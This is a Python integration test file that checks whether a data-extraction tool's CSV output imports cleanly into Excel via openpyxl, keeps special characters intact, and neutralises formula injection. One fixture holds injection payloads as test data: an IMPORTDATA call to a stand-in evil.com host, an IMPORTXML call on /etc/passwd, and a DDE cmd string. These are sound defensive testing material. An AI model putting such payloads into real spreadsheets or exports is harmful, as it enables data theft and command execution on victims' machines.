"""Integration tests for CSV-Excel import validation (Story 3.10).

Validates CSV output can be successfully imported into Excel via openpyxl,
preserves special characters, and prevents formula injection attacks.

Test Coverage:
    - AC-3.10-1: CSV loads into openpyxl without errors
    - AC-3.10-2: Schema and column headers validate correctly
    - AC-3.10-3: Special characters preserved (emoji, Chinese, Arabic, etc.)
    - AC-3.10-4: Formula injection prevention (=, +, -, @ prefixes)

These tests were developed using ATDD (Acceptance Test-Driven Development) approach
to ensure Excel compatibility before implementation.
"""

from __future__ import annotations

import csv
from pathlib import Path
from typing import Iterable, List

import pytest

pytestmark = [pytest.mark.P1, pytest.mark.integration, pytest.mark.output]

import openpyxl  # noqa: E402
from openpyxl.workbook import Workbook  # noqa: E402

from data_extract.chunk.entity_preserver import EntityReference  # noqa: E402
from data_extract.chunk.models import Chunk, ChunkMetadata  # noqa: E402
from data_extract.chunk.quality import QualityScore  # noqa: E402
from data_extract.output.formatters.csv_formatter import CsvFormatter  # noqa: E402

pytestmark = [pytest.mark.integration, pytest.mark.output]

# Canonical schema from Story 3.6
EXPECTED_COLUMNS: List[str] = [
    "chunk_id",
    "source_file",
    "section_context",
    "chunk_text",
    "entity_tags",
    "quality_score",
    "word_count",
    "token_count",
    "processing_version",
    "warnings",
]


@pytest.fixture
def csv_formatter() -> CsvFormatter:
    """Provide CsvFormatter with validation enabled."""
    return CsvFormatter(validate=False)  # Skip multi-parser validation for Excel tests


@pytest.fixture
def basic_chunk(tmp_path: Path) -> Chunk:
    """Create a basic chunk for testing Excel import."""
    source_file = tmp_path / "test-doc.pdf"
    source_file.write_text("dummy", encoding="utf-8")

    metadata = ChunkMetadata(
        entity_tags=[],
        section_context="Test Section",
        quality=QualityScore(
            readability_flesch_kincaid=8.5,
            readability_gunning_fog=9.2,
            ocr_confidence=0.95,
            completeness=0.9,
            coherence=0.88,
            overall=0.89,
            flags=[],
        ),
        source_hash="test123",
        document_type="test",
        word_count=50,
        token_count=75,
        created_at=None,
        processing_version="1.0.0",
        source_file=source_file,
        config_snapshot={"chunk_size": 512},
    )

    return Chunk(
        id="chunk_001",
        text="Basic test content for Excel validation.",
        document_id="doc_001",
        position_index=0,
        token_count=75,
        word_count=50,
        entities=[],
        section_context="Test Section",
        quality_score=0.89,
        readability_scores={"flesch_kincaid": 8.5},
        metadata=metadata,
    )


@pytest.fixture
def special_char_chunk(tmp_path: Path) -> Chunk:
    """Create chunk with special characters for testing preservation."""
    source_file = tmp_path / "special-chars.pdf"
    source_file.write_text("dummy", encoding="utf-8")

    # Include various special characters per AC-3.10-3
    special_text = """Text with special characters:
    - Commas: one, two, three
    - Quotes: "double quotes" and 'single quotes'
    - Newlines: First line
    Second line
    Third line
    - Emoji: 🧪 🚀 ✅ 🔧
    - Chinese: 你好世界 (Hello World)
    - Arabic: مرحبا بالعالم (Hello World)
    - Math symbols: α β γ ∑ ∏ √
    - Currency: $100 €50 £75 ¥1000"""

    metadata = ChunkMetadata(
        entity_tags=[
            EntityReference(
                entity_type="test",
                entity_id="TEST-001",
                start_pos=0,
                end_pos=10,
                is_partial=False,
                context_snippet="Test entity",
            )
        ],
        section_context="Special Characters Test",
        quality=QualityScore(
            readability_flesch_kincaid=7.8,
            readability_gunning_fog=8.5,
            ocr_confidence=0.98,
            completeness=0.95,
            coherence=0.92,
            overall=0.91,
            flags=[],
        ),
        source_hash="special456",
        document_type="test",
        word_count=100,
        token_count=150,
        created_at=None,
        processing_version="1.0.0",
        source_file=source_file,
        config_snapshot={"chunk_size": 512},
    )

    return Chunk(
        id="chunk_special",
        text=special_text,
        document_id="doc_special",
        position_index=0,
        token_count=150,
        word_count=100,
        entities=[],
        section_context="Special Characters Test",
        quality_score=0.91,
        readability_scores={"flesch_kincaid": 7.8},
        metadata=metadata,
    )


@pytest.fixture
def formula_injection_chunk(tmp_path: Path) -> Chunk:
    """Create chunk with potentially dangerous formula content."""
    source_file = tmp_path / "formula-injection.pdf"
    source_file.write_text("dummy", encoding="utf-8")

    # Include dangerous formula patterns per AC-3.10-4
    dangerous_text = """Potentially dangerous content:
    =SUM(A1:A10)
    +IMPORTXML("/etc/passwd")
    -2+2
    @IMPORTDATA("http://evil.com/steal")
    =1+1+cmd|'/c calc'!A1
    """

    metadata = ChunkMetadata(
        entity_tags=[],
        section_context="Formula Injection Test",
        quality=QualityScore(
            readability_flesch_kincaid=6.5,
            readability_gunning_fog=7.2,
            ocr_confidence=1.0,
            completeness=1.0,
            coherence=0.85,
            overall=0.88,
            flags=["FORMULA_RISK"],
        ),
        source_hash="danger789",
        document_type="test",
        word_count=30,
        token_count=45,
        created_at=None,
        processing_version="1.0.0",
        source_file=source_file,
        config_snapshot={"chunk_size": 512},
    )

    return Chunk(
        id="chunk_danger",
        text=dangerous_text,
        document_id="doc_danger",
        position_index=0,
        token_count=45,
        word_count=30,
        entities=[],
        section_context="Formula Injection Test",
        quality_score=0.88,
        readability_scores={"flesch_kincaid": 6.5},
        metadata=metadata,
    )


class TestExcelImportValidation:
    """Validate CSV output can be imported into Excel via openpyxl."""

    def test_excel_import_validation(
        self, csv_formatter: CsvFormatter, basic_chunk: Chunk, tmp_path: Path
    ) -> None:
        """
        GIVEN: CSV file generated by CsvFormatter
        WHEN: File loaded via openpyxl (Excel library)
        THEN: Workbook loads without errors, all 10 columns present with correct headers, all rows accessible

        Validates AC-3.10-1 and AC-3.10-2.
        """
        # GIVEN: Generate CSV file
        csv_path = tmp_path / "excel_test.csv"
        chunks: Iterable[Chunk] = [basic_chunk]
        csv_formatter.format_chunks(chunks, csv_path)

        # First convert CSV to Excel format
        excel_path = tmp_path / "excel_test.xlsx"
        self._csv_to_excel(csv_path, excel_path)

        # WHEN: Load Excel workbook with openpyxl
        workbook: Workbook = openpyxl.load_workbook(excel_path)
        sheet = workbook.active

        # THEN: Verify workbook loads without errors (AC-3.10-1)
        assert workbook is not None
        assert sheet is not None

        # THEN: Verify all 10 columns present with correct headers (AC-3.10-2)
        headers = [cell.value for cell in sheet[1]]  # First row contains headers
        assert headers == EXPECTED_COLUMNS, f"Headers mismatch: {headers}"

        # THEN: Verify all rows are accessible
        row_count = sheet.max_row
        assert row_count >= 2, "Should have at least header row and one data row"

        # Verify data row content
        data_row = [cell.value for cell in sheet[2]]
        assert data_row[0] == "chunk_001"  # chunk_id
        assert "test-doc.pdf" in str(data_row[1])  # source_file
        assert data_row[2] == "Test Section"  # section_context
        assert "Basic test content" in str(data_row[3])  # chunk_text

        workbook.close()

    def test_excel_special_characters(
        self, csv_formatter: CsvFormatter, special_char_chunk: Chunk, tmp_path: Path
    ) -> None:
        """
        GIVEN: CSV with special characters (commas, quotes, newlines, emoji, Chinese, Arabic)
        WHEN: Loaded into Excel
        THEN: All special characters preserved correctly (no corruption)

        Validates AC-3.10-3.
        """
        # GIVEN: Generate CSV with special characters
        csv_path = tmp_path / "special_chars.csv"
        chunks: Iterable[Chunk] = [special_char_chunk]
        csv_formatter.format_chunks(chunks, csv_path)

        # Convert to Excel
        excel_path = tmp_path / "special_chars.xlsx"
        self._csv_to_excel(csv_path, excel_path)

        # WHEN: Load Excel workbook
        workbook: Workbook = openpyxl.load_workbook(excel_path)
        sheet = workbook.active

        # THEN: Verify special characters are preserved
        chunk_text = sheet.cell(row=2, column=4).value  # chunk_text column

        # Check various special characters
        assert "one, two, three" in chunk_text, "Commas not preserved"
        assert '"double quotes"' in chunk_text, "Double quotes not preserved"
        assert "First line" in chunk_text and "Second line" in chunk_text, "Newlines not preserved"
        assert "🧪" in chunk_text, "Test tube emoji not preserved"
        assert "🚀" in chunk_text, "Rocket emoji not preserved"
        assert "✅" in chunk_text, "Checkmark emoji not preserved"
        assert "你好世界" in chunk_text, "Chinese characters not preserved"
        assert "مرحبا بالعالم" in chunk_text, "Arabic characters not preserved"
        assert "α β γ" in chunk_text, "Greek letters not preserved"
        assert "$100 €50 £75 ¥1000" in chunk_text, "Currency symbols not preserved"

        workbook.close()

    def test_excel_formula_injection_prevention(
        self, csv_formatter: CsvFormatter, formula_injection_chunk: Chunk, tmp_path: Path
    ) -> None:
        """
        GIVEN: CSV with potentially dangerous content (=SUM, @IMPORTXML, etc.)
        WHEN: Loaded into Excel
        THEN: Content treated as text (not executed as formula)

        Validates AC-3.10-4.
        """
        # GIVEN: Generate CSV with dangerous formula content
        csv_path = tmp_path / "formula_injection.csv"
        chunks: Iterable[Chunk] = [formula_injection_chunk]
        csv_formatter.format_chunks(chunks, csv_path)

        # Convert to Excel
        excel_path = tmp_path / "formula_injection.xlsx"
        self._csv_to_excel(csv_path, excel_path)

        # WHEN: Load Excel workbook
        workbook: Workbook = openpyxl.load_workbook(excel_path, data_only=False)
        sheet = workbook.active

        # THEN: Verify dangerous content is treated as text, not formulas
        chunk_text = sheet.cell(row=2, column=4).value  # chunk_text column

        # Check that content is stored as string, not formula
        assert isinstance(chunk_text, str), "Content should be string, not formula"

        # Verify dangerous patterns are present but as text
        assert (
            "=SUM(A1:A10)" in chunk_text or "'=SUM(A1:A10)" in chunk_text
        ), "Formula should be escaped"
        assert (
            "@IMPORTDATA" in chunk_text or "'@IMPORTDATA" in chunk_text
        ), "Import should be escaped"

        # Check that Excel doesn't interpret these as formulas
        # If they were formulas, cell.data_type would be 'f' (formula)
        cell = sheet.cell(row=2, column=4)
        assert cell.data_type != "f", "Cell should not contain formula"

        workbook.close()

    def _csv_to_excel(self, csv_path: Path, excel_path: Path) -> None:
        """
        Helper method to convert CSV to Excel format.

        This simulates the real-world scenario where users open CSV in Excel,
        which converts it to Excel's internal format.
        """
        workbook = openpyxl.Workbook()
        sheet = workbook.active

        # Read CSV and write to Excel
        with open(csv_path, "r", encoding="utf-8-sig", newline="") as csv_file:
            csv_reader = csv.reader(csv_file)
            for row_idx, row_data in enumerate(csv_reader, start=1):
                for col_idx, cell_value in enumerate(row_data, start=1):
                    # Excel formula injection prevention: prefix with apostrophe
                    if cell_value and cell_value[0] in ("=", "+", "-", "@"):
                        cell_value = "'" + cell_value
                    sheet.cell(row=row_idx, column=col_idx, value=cell_value)

        workbook.save(excel_path)
        workbook.close()
